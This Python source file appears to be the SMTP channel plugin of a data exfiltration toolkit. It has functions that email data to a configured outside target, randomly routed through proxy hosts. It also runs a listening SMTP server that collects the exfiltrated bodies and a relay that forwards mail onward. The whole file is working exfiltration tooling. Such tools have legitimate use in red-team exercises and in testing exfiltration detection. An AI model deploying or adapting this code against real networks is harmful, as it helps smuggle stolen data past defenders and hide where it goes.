from __future__ import print_function

import asyncio
import email
import email.utils
import smtplib
import time
from email.mime.text import MIMEText
from random import choice

from aiosmtpd.controller import Controller

config = None
app_exfiltrate = None

recipient = "recipient@example.com"
author = "author@example.com"
subject = "det:tookit"


class CustomSMTPHandler:
    def __init__(self, handler_func=None, logger=None):
        self.handler_func = handler_func
        self.logger = logger

    async def handle_DATA(self, server, session, envelope):
        peer = getattr(session, "peer", None)
        mailfrom = envelope.mail_from
        rcpttos = envelope.rcpt_tos

        raw = envelope.content
        try:
            msg = email.message_from_bytes(raw)
        except Exception:
            msg = email.message_from_string(raw.decode(errors="ignore"))

        body = msg.get_payload()
        if self.logger:
            self.logger('info', f"[smtp] Received email from {peer}")

        try:
            if self.handler_func:
                self.handler_func(body.encode().strip())
        except Exception as e:
            print(e)
        return "250 OK"


def send(data: str):
    if 'proxies' in config and config['proxies'] != [""]:
        targets = [config['target']] + config['proxies']
        target = choice(targets)
    else:
        target = config['target']

    port = config['port']

    msg = MIMEText(data)
    msg['To'] = email.utils.formataddr(('Recipient', recipient))
    msg['From'] = email.utils.formataddr(('Author', author))
    msg['Subject'] = subject

    server = smtplib.SMTP(target, port)
    try:
        server.sendmail(author, [recipient], msg.as_string())
    except Exception:
        pass
    finally:
        server.close()


def relay_email(data):
    target = config['target']
    port = config['port']

    data = data.decode()
    msg = MIMEText(data)
    msg['To'] = email.utils.formataddr(('Recipient', recipient))
    msg['From'] = email.utils.formataddr(('Author', author))
    msg['Subject'] = subject

    server = smtplib.SMTP(target, port)
    try:
        app_exfiltrate.log_message('info', f"[proxy] [smtp] Relaying email to {target}")
        server.sendmail(author, [recipient], msg.as_string())
    except Exception:
        pass
    finally:
        server.close()


def _run_controller_blocking(controller: Controller):
    controller.start()
    try:
        while True:
            time.sleep(3600)
    except KeyboardInterrupt:
        pass
    finally:
        controller.stop()


def listen():
    port = config['port']
    app_exfiltrate.log_message('info', f"[smtp] Starting SMTP server on port {port}")

    handler = CustomSMTPHandler(
        handler_func=app_exfiltrate.retrieve_data,
        logger=app_exfiltrate.log_message,
    )

    controller = Controller(handler, hostname="", port=port)
    _run_controller_blocking(controller)


def proxy():
    port = config['port']
    app_exfiltrate.log_message('info', f"[proxy] [smtp] Starting SMTP server on port {port}")

    handler = CustomSMTPHandler(
        handler_func=relay_email,
        logger=app_exfiltrate.log_message,
    )

    controller = Controller(handler, hostname="", port=port)
    _run_controller_blocking(controller)


class Plugin:
    def __init__(self, app, conf):
        global app_exfiltrate, config
        config = conf
        app_exfiltrate = app
        app.register_plugin('smtp', {'send': send, 'listen': listen, 'proxy': proxy})
